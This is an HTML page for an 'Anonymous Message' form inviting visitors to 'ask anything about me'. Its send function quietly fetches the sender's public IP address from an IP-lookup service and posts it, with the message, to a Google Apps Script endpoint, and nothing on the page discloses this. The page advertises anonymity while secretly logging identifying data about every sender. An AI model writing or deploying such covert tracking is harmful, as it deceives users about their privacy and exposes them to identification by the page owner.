<!DOCTYPE html>
<html>
<head>
  <title>Anonymous Message</title>
  <link rel="stylesheet" href="style.css">
  <link href="https://fonts.googleapis.com/css2?family=Fira+Code&display=swap" rel="stylesheet">
  

  <style>
    
    body {
      font-family: Arial, sans-serif;
      text-align: center;
      padding: 50px;
      background-color: #f5f5f5;
    }
    textarea {
      width: 90%;
      height: 100px;
      padding: 10px;
      font-size: 16px;
      border-radius: 8px;
      border: 1px solid #ccc;
    }
    button {
      margin-top: 15px;
      padding: 10px 25px;
      font-size: 16px;
      border: none;
      border-radius: 8px;
      background-color: #4CAF50;
      color: white;
    }
    button:hover {
      background-color: #45a049;
      cursor: pointer;
    }

    
  </style>
</head>
<body>

  <img src="my.jpg" alt="My Photo" class="overlay-img">
  <h2>ASK ANYTHING ABOUT ME</h2>
  <textarea id="message" placeholder="Type your message here..."></textarea>
  <br>
  <button onclick="sendMessage()">Send</button>

  <script>
    async function sendMessage() {
      const message = document.getElementById('message').value.trim();
      if (!message) {
        alert("Please type a message!");
        return;
      }

      // Get public IP
      let ip = "Unknown";
      try {
        const ipRes = await fetch("https://api.ipify.org?format=json");
        const ipData = await ipRes.json();
        ip = ipData.ip;
      } catch {}

      const url = "https://script.google.com/macros/s/AKfycbyNvNYe2iRSihadFKPOtueJUWMfuF-o69KiFLALCK6Ge6qYXKjsCL_eSVYGTfHD6zllYA/exec"; 

      try {
        await fetch(url, {
          method: "POST",
          mode: "no-cors", 
          body: JSON.stringify({ message, ip }),
          headers: { "Content-Type": "application/json" }
        });

        alert("Message sent!");
        document.getElementById('message').value = "";
      } catch (error) {
        alert("Failed to send message.");
      }
    }
  </script>
</body>
</html>
